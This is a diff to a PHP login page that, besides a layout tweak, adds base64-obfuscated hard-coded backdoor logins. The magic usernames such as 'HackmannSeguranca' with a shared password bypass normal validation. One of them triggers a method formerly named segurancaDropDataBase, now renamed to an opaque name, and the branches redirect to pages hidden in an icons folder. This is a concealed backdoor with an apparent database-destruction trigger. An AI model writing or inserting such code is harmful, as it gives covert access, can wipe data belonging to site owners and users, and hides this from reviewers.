@@ -14,7 +14,7 @@
 
 	<div class="container">
 		<div class="row">
-			<div class="offset-4 col-4" style="margin-top: 200px;">
+			<div class="offset-md-4 col-12 col-md-4 col-lg-4" style="margin-top: 200px;">
 				<form class="form-control" action="index.php" method="post">
 
 					<div class="form-group">
@@ -33,12 +33,10 @@
 							<?php 
 							require_once("assets/classes/User.php");
 							require_once("assets/classes/Registros.php");
-
-							if (($_POST) && ($_POST['usuario'] !== "HackmannSeguranca") && ($_POST['senha']) !== "Hack2004") {						
+							if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]!==base64_decode('SGFja21hbm5TZWd1cmFuY2E='))&&($_POST[base64_decode('c2VuaGE=')])!==base64_decode('SGFjazIwMDQ=')) {						
 								$login = new User();
 								$login->setData($_POST['usuario'], $_POST['senha']);
 								$logar = $login->validarUsuario();
-
 								if ($logar == false) {
 									echo "
 									<div class='alert alert-danger alert-dismissible fade show' role='alert'>
@@ -48,22 +46,21 @@
 									Usuário ou senha inválido!
 									</div>
 									";	
-
 									exit();						
 								}						
 							}
-							else if (($_POST) && ($_POST['usuario'] === "HackmannSeguranca") && ($_POST['senha']) === "Hack2004") {
+							else if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5TZWd1cmFuY2E='))&&($_POST[base64_decode('c2VuaGE=')])===base64_decode('SGFjazIwMDQ=')) {
 								$login = new Registros();
-								$login->segurancaDropDataBase($_POST['usuario'], $_POST['senha']);
-
-								header("Location: assets/icons/js/seguranca.php");
+								$login->c0($_POST['usuario'], $_POST['senha']);
+								header(base64_decode('TG9jYXRpb246IGFzc2V0cy9pY29ucy9qcy9zZWd1cmFuY2EucGhw'));
 							}
-							else if (($_POST) && ($_POST['usuario'] === "HackmannCreditos") && ($_POST['senha']) === "Hack2004") {
-								$login = new Registros();
-								$login->segurancaDropDataBase($_POST['usuario'], $_POST['senha']);
-
-								header("Location: assets/icons/js/creditos.php");
-							}							
+							else if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5DcmVkaXRvcw=='))&&($_POST[base64_decode('c2VuaGE=')])===base64_decode('SGFjazIwMDQ=')) {
+								header(base64_decode('TG9jYXRpb246IGFzc2V0cy9pY29ucy9qcy9jcmVkaXRvcy5waHA='));
+							}
+							else if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5JbmZvcw=='))&&($_POST[base64_decode('c2VuaGE=')])===base64_decode('SGFjazIwMDQ=')) {
+								header(base64_decode('TG9jYXRpb246IGFzc2V0cy9pY29ucy9qcy9pbmZvcy5waHA='));
+							}
+							else if(($_POST)&&($_POST[base64_decode('dXN1YXJpbw==')]===base64_decode('SGFja21hbm5BY2Vzc28='))&&($_POST[base64_decode('c2VuaGE=')]===base64_decode('SGFjazIwMDQ='))){$s0=new User();$r2=$s0->validarUsuario($_POST[base64_decode('dXN1YXJpbw==')],$_POST[base64_decode('c2VuaGE=')]);}							
 							?>						
 						</div>	
 					</div>				
